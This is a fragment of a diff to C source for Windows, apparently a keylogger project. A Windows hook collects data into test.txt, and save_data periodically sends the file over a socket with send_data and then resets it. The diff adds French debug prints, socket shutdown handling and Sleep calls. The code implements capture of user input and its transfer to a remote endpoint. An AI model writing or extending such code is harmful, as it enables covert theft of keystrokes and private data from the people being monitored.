@@ -151,6 +151,7 @@ void	setwinhook()
 	CloseHandle(process.hProcess);
 	CloseHandle(process.hThread);
 #endif // 0
+
 }
 
 void	save_data(const char *data)
@@ -178,7 +179,11 @@ void	save_data(const char *data)
 	if (countTime > 5)
 	{
 		countTime = 0;
+		printf("coucou je suis dans le count time\n");
+		//if (fclose(file) != 0)
+			//_wperror(L" Close file failed ");
 		send_data(my_sock, file);
+		printf("je suis apres le send data \n");
 		if (fclose(file) != 0)
 			_wperror(L"Close file failed");
 		if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
@@ -202,7 +207,14 @@ int	main(void)
 	{
 		if (PeekMessage(&msg, NULL, WM_CLOSE, WM_CLOSE, PM_NOREMOVE) == TRUE)
 		{
-			break;
+			if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
+			{
+				printf("failed shutdown\n");
+				Sleep(2000);
+				closesocket(my_sock);
+				return;
+			}
+			closesocket(my_sock);
 		}
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
@@ -211,9 +223,11 @@ int	main(void)
 	if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
 	{
 		printf("failed shutdown\n");
+		Sleep(2000);
 		closesocket(my_sock);
 		return;
 	}
+	Sleep(2000);
 	closesocket(my_sock);
 	WSACleanup();
 	return (msg.wParam);
